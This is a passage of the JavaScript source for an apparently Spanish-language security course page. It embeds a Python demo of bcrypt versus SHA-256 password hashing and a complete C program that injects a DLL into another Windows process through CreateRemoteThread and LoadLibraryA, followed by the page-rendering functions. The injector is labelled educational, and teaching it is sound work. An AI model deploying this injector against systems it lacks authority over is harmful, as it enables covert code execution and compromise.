  ]
},

          import hashlib
          import bcrypt
          import time

          contrasena = "MiContraseña2024!"
          contrasena_bytes = contrasena.encode('utf-8')

          # ── MAL: SHA-256 para contraseñas ────────────────────────
          t0 = time.perf_counter()
          for _ in range(100_000):
              hashlib.sha256(contrasena_bytes).hexdigest()
          t_sha = time.perf_counter() - t0
          print(f"SHA-256: 100.000 hashes en {t_sha:.3f}s  ({100_000/t_sha:,.0f}/s)")
          # En una GPU moderna: ~10 BILLONES por segundo → inseguro para contraseñas

          # ── BIEN: bcrypt (lento por diseño) ─────────────────────
          t0 = time.perf_counter()
          hashed = bcrypt.hashpw(contrasena_bytes, bcrypt.gensalt(rounds=12))
          t_bcrypt = time.perf_counter() - t0
          print(f"bcrypt (rounds=12): 1 hash en {t_bcrypt:.3f}s")
          # ~0.3 segundos por hash → ataque de fuerza bruta impracticable

          # Verificar la contraseña (la única forma correcta)
          es_correcta = bcrypt.checkpw(contrasena_bytes, hashed)
          print(f"Contraseña verificada: {es_correcta}")  # True

          # Contraseña incorrecta
          es_incorrecta = bcrypt.checkpw(b"OtraContrasena", hashed)
          print(f"Intento fallido: {es_incorrecta}")        # False

          # El hash incluye el salt — cada hash es distinto aunque la contraseña sea igual
          h1 = bcrypt.hashpw(contrasena_bytes, bcrypt.gensalt())
          h2 = bcrypt.hashpw(contrasena_bytes, bcrypt.gensalt())
          print(f"Misma contraseña, distinto hash: {h1 != h2}")  # True
          `

          /*
          * inject.c — DLL Injection clásico
          * EDUCATIVO: para aprender cómo funcionan las técnicas de inyección
          * Compilar: cl.exe inject.c /link /out:inject.exe
          * Usar SOLO en máquinas propias o en labs controlados
          */
          #include <windows.h>
          #include <tlhelp32.h>
          #include <stdio.h>

          // Buscar el PID de un proceso por nombre
          DWORD buscarPID(const char* nombre) {
              HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
              PROCESSENTRY32 pe = { sizeof(pe) };

              if (Process32First(snap, &pe)) {
                  do {
                      if (!_stricmp(pe.szExeFile, nombre)) {
                          CloseHandle(snap);
                          return pe.th32ProcessID;
                      }
                  } while (Process32Next(snap, &pe));
              }
              CloseHandle(snap);
              return 0;
          }

          // Inyectar una DLL en un proceso remoto
          BOOL inyectarDLL(DWORD pid, const char* rutaDLL) {
              HANDLE hProc = OpenProcess(
                  PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD,
                  FALSE, pid);

              if (!hProc) {
                  printf("[-] No se pudo abrir el proceso %d: %d\n", pid, GetLastError());
                  return FALSE;
              }

              // 1. Reservar memoria en el proceso remoto
              SIZE_T len = strlen(rutaDLL) + 1;
              LPVOID remoto = VirtualAllocEx(hProc, NULL, len,
                                              MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
              if (!remoto) {
                  printf("[-] VirtualAllocEx falló: %d\n", GetLastError());
                  CloseHandle(hProc);
                  return FALSE;
              }

              // 2. Escribir la ruta de la DLL en el proceso remoto
              if (!WriteProcessMemory(hProc, remoto, rutaDLL, len, NULL)) {
                  printf("[-] WriteProcessMemory falló: %d\n", GetLastError());
                  VirtualFreeEx(hProc, remoto, 0, MEM_RELEASE);
                  CloseHandle(hProc);
                  return FALSE;
              }

              // 3. Crear un hilo remoto que llame a LoadLibraryA con la ruta de la DLL
              HMODULE kernel32 = GetModuleHandle("kernel32.dll");
              LPTHREAD_START_ROUTINE loadLib =
                  (LPTHREAD_START_ROUTINE)GetProcAddress(kernel32, "LoadLibraryA");

              HANDLE hHilo = CreateRemoteThread(hProc, NULL, 0, loadLib, remoto, 0, NULL);
              if (!hHilo) {
                  printf("[-] CreateRemoteThread falló: %d\n", GetLastError());
                  VirtualFreeEx(hProc, remoto, 0, MEM_RELEASE);
                  CloseHandle(hProc);
                  return FALSE;
              }

              WaitForSingleObject(hHilo, INFINITE);
              VirtualFreeEx(hProc, remoto, 0, MEM_RELEASE);
              CloseHandle(hHilo);
              CloseHandle(hProc);
              printf("[+] DLL inyectada en PID %d\n", pid);
              return TRUE;
          }

          int main(int argc, char* argv[]) {
              if (argc < 3) {
                  printf("Uso: inject.exe <proceso.exe> <C:\\ruta\\payload.dll>\n");
                  printf("Ejemplo: inject.exe notepad.exe C:\\Tools\\payload.dll\n");
                  return 1;
              }

              DWORD pid = buscarPID(argv[1]);
              if (!pid) {
                  printf("[-] Proceso '%s' no encontrado\n", argv[1]);
                  return 1;
              }

              printf("[*] PID de %s: %d\n", argv[1], pid);
              return inyectarDLL(pid, argv[2]) ? 0 : 1;
          }

function buildSidebar() {
  const nav = document.getElementById('sb-nav');
  BLOQUES.forEach((b, bi) => {
    const wrap = document.createElement('div');
    wrap.className = 'sb-bloque';
    wrap.id = 'sb-b' + bi;

    const hdr = document.createElement('div');
    hdr.className = 'sb-bloque-hdr';
    hdr.innerHTML = `<span class="sb-dot dot${bi}"></span>
      <span class="sb-bloque-title">${b.title}</span>
      <span class="sb-bloque-num">${b.label}</span>
      <span class="sb-chevron">›</span>`;
    hdr.onclick = () => { wrap.classList.toggle('closed'); };
    wrap.appendChild(hdr);

    const items = document.createElement('div');
    items.className = 'sb-items';

    b.sections.forEach(sec => {
      const lbl = document.createElement('div');
      lbl.className = 'sb-sec-label';
      lbl.textContent = sec.title;
      items.appendChild(lbl);

      sec.topics.forEach(t => {
        const a = document.createElement('a');
        a.className = 'sb-item';
        a.textContent = t.title;
        a.href = '#' + topicId(t.title);
        a.onclick = (e) => { e.preventDefault(); scrollToTopic(topicId(t.title)); };
        items.appendChild(a);
      });
    });

    wrap.appendChild(items);
    nav.appendChild(wrap);
  });
}

function buildTOC() {
  const g = document.getElementById('toc');
  BLOQUES.forEach((b, bi) => {
    const a = document.createElement('a');
    a.className = 'toc-item';
    a.href = '#' + b.id;
    a.innerHTML = `<span class="toc-num c${bi}">${bi}</span><span class="toc-lbl">${b.title}</span>`;
    a.onclick = e => { e.preventDefault(); scrollToBloque(b.id); };
    g.appendChild(a);
  });
}

function buildContent() {
  const root = document.getElementById('content');
  BLOQUES.forEach((b, bi) => {
    const bDiv = document.createElement('div');
    bDiv.className = 'bloque';
    bDiv.id = b.id;

    bDiv.innerHTML = `<div class="bloque-hdr">
      <div>
        <div><span class="bloque-badge bg${bi}">${b.label}</span></div>
        <h2>${safe(b.title)}</h2>
        <div class="bloque-meta">
          <span class="b-tag">⏱ ${safe(b.weeks)}</span>
          <span class="b-tag">${safe(b.tipo)}</span>
          <span class="b-tag">${safe(b.requisitos)}</span>
        </div>
      </div>
    </div>`;

    b.sections.forEach(sec => {
      const sDiv = document.createElement('div');
      sDiv.className = 'section';
      sDiv.innerHTML = `<div class="sec-title">${safe(sec.title)}</div>`;

      sec.topics.forEach((t, ti) => {
        const tc = ['#8b7ff7','#56d4b2','#f47c6e','#6ab8f5','#e07be0','#f5cc45','#82dd95','#f5a348'];
        const c = tc[(bi * 3 + ti) % tc.length];
        const tid = topicId(t.title);

        const div = document.createElement('div');
        div.className = 'topic';
        div.id = tid;

        const tagsArr = (t.code || []).length > 0 ? ['Teoría','Práctica','Código'] : ['Teoría','Práctica'];

        div.innerHTML = `<div class="topic-hdr">
          <span class="t-dot" style="background:${c}"></span>
          <span class="t-title">${safe(t.title)}</span>
          <span class="t-tag" style="background:${c}22;color:${c}">${safe(t.tag)}</span>
          <span class="t-chev">›</span>
        </div>
        <div class="topic-body">
          <div class="tabs">${tagsArr.map((l,i)=>`<button class="tab-btn${i===0?' active':''}" data-tab="${i}">${l}</button>`).join('')}</div>
          <div class="tab-pane active" data-pane="0">
            <ul class="items-list">${t.items.map(x=>`<li>${safe(x)}</li>`).join('')}</ul>
            ${t.note ? `<div class="note"><strong>⚠ Nota:</strong> ${safe(t.note)}</div>` : ''}
          </div>
          <div class="tab-pane" data-pane="1">
            ${t.practica ? `<ul class="prac-list">${t.practica.map((p,i)=>`<li class="prac-item"><span class="prac-num">${String(i+1).padStart(2,'0')}</span><span class="prac-text">${safe(p)}</span></li>`).join('')}</ul>` : '<p style="color:var(--txt3);font-size:13px;padding-top:10px">Ver sección de teoría y aplicar los conceptos con proyectos propios.</p>'}
          </div>
          ${(t.code||[]).length > 0 ? `<div class="tab-pane" data-pane="2">${(t.code||[]).map(block=>`<div class="code-wrap"><div class="code-label"><span>${safeText(block.label)}</span><button class="copy-btn" onclick="copyCode(this)">copiar</button></div><pre><code>${escapeCode(block.src)}</code></pre></div>`).join('')}</div>` : ''}
        </div>`;

        div.querySelector('.topic-hdr').onclick = () => { div.classList.toggle('open'); };

        div.querySelectorAll('.tab-btn').forEach(btn => {
          btn.onclick = e => {
            e.stopPropagation();
            const idx = btn.dataset.tab;
            div.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
            div.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
            btn.classList.add('active');
            div.querySelector(`.tab-pane[data-pane="${idx}"]`).classList.add('active');
            if (!div.classList.contains('open')) div.classList.add('open');
          };
        });

        sDiv.appendChild(div);
      });

      bDiv.appendChild(sDiv);
    });

    root.appendChild(bDiv);
  });
}

function topicId(title) {
  return 'topic-' + title.slice(0, 30).toLowerCase().replace(/[^a-z0-9]+/g, '-').replace(/-+$/, '');
}

function escapeCode(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function safeText(str) {
  return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

function scrollToBloque(id) {
  document.getElementById(id)?.scrollIntoView({ behavior: 'smooth', block: 'start' });
  if (window.innerWidth < 768) toggleSidebar();
}

function scrollToTopic(id) {
  const el = document.getElementById(id);
  if (!el) return;
  el.scrollIntoView({ behavior: 'smooth', block: 'start' });
  if (!el.classList.contains('open')) el.classList.add('open');
  if (window.innerWidth < 768) toggleSidebar();
}

function toggleSidebar() {
  const sb = document.getElementById('sb');
  const ov = document.getElementById('overlay');
  sb.classList.toggle('open');
  ov.classList.toggle('visible');
}

function copyCode(btn) {
  const code = btn.closest('.code-wrap').querySelector('code').textContent;
  navigator.clipboard.writeText(code).then(() => {
    btn.textContent = '✓ copiado';
    setTimeout(() => btn.textContent = 'copiar', 1800);
  });
}

function filterSidebar(q) {
  const lq = q.trim().toLowerCase();

  document.querySelectorAll('.sb-bloque').forEach(block => {

    const blockTitle =
      block.querySelector('.sb-bloque-title')
      ?.textContent
      .toLowerCase() || '';

    let blockHasMatch =
      !lq || blockTitle.includes(lq);

    const sections =
      block.querySelectorAll('.sb-sec-label');

    sections.forEach(label => {

      const sectionTitle =
        label.textContent.toLowerCase();

      let sectionHasMatch =
        !lq || sectionTitle.includes(lq);

      let next = label.nextElementSibling;

      while (
        next &&
        !next.classList.contains('sb-sec-label')
      ) {

        if (next.classList.contains('sb-item')) {

          const href =
            next.getAttribute('href');

          const topic =
            document.querySelector(href);

          const searchable = [
            blockTitle,
            sectionTitle,
            next.textContent,
            topic?.textContent || ''
          ]
          .join(' ')
          .toLowerCase();

          const match =
            !lq || searchable.includes(lq);

          next.style.display =
            match ? '' : 'none';

          if (match) {
            sectionHasMatch = true;
            blockHasMatch = true;
          }
        }

        next = next.nextElementSibling;
      }

      label.style.display =
        sectionHasMatch ? '' : 'none';
    });

    block.style.display =
      blockHasMatch ? '' : 'none';

    if (lq && blockHasMatch) {
      block.classList.remove('closed');
    }
  });
}

function setupObserver() {
  const observer = new IntersectionObserver(entries => {
    entries.forEach(e => {
      if (e.isIntersecting) {
        const id = e.target.id;
        document.querySelectorAll('.sb-item').forEach(a => {
          a.classList.toggle('active', a.getAttribute('href') === '#' + id);
        });
      }
    });
  }, { threshold: 0.1, rootMargin: '-50px 0px -60% 0px' });

  document.querySelectorAll('.topic').forEach(el => observer.observe(el));
}

buildSidebar();
buildTOC();
buildContent();
setupObserver();
